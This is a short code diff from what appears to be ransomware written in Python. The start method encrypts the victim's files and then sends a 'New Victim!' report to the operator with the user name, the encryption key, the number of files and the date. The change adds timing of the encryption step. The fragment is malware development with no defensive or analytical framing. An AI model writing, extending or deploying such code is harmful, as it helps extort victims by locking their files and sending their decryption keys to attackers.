@@ -124,8 +124,8 @@ class Main:
         WINDOW.mainloop()
 
     def start(self):
-        self.encrypt()
-        send(message=f"""New Victim!\nDetails:\n - Victim: {self.USER}\n - Key: {self.KEY.decode()}\n - Files: {self.COUNTER}\n - Date: {self.DATE}\n - Time: {self.TIME}""")
+        ENCRYPTION_TIME = better_round(timeit(self.encrypt, number=1), 3)
+        send(message=f"""New Victim!\nDetails:\n - Victim: {self.USER}\n - Key: {self.KEY.decode()}\n - Files: {self.COUNTER}\n - Date and time: {self.DATE} | {self.TIME}\n - Encryption time: {ENCRYPTION_TIME}""")
         self.window()
 
 
